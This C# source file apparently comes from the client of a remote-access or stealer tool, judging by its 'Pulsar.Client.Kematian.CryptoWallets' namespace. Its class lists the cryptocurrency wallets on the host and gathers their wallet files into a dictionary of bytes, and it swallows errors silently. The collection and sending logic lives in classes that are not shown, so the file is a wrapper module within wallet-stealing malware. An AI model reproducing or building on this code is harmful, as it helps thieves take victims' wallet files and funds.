using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Pulsar.Client.Kematian.CryptoWallets
{
    public class CryptoWalletRetriever
    {
        /// <summary>
        /// Gets information about crypto wallets installed on the system
        /// </summary>
        /// <returns>String with information about all crypto wallets</returns>
        public static string GetCryptoWallets()
        {
            // Get wallet information from GetWallets
            string walletInfo = GetWallets.Wallets();
            return walletInfo;
        }

        /// <summary>
        /// Gets all wallet files from the system
        /// </summary>
        /// <returns>Dictionary containing wallet files</returns>
        public static Dictionary<string, byte[]> GetCryptoWalletFiles()
        {
            Dictionary<string, byte[]> localWalletFiles = new Dictionary<string, byte[]>();
            
            try
            {
                // Get local wallet files only
                localWalletFiles = LocalWallets.GetLocalWalletFiles();
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error retrieving wallet files: {ex.Message}");
            }
            
            return localWalletFiles;
        }
    }
} 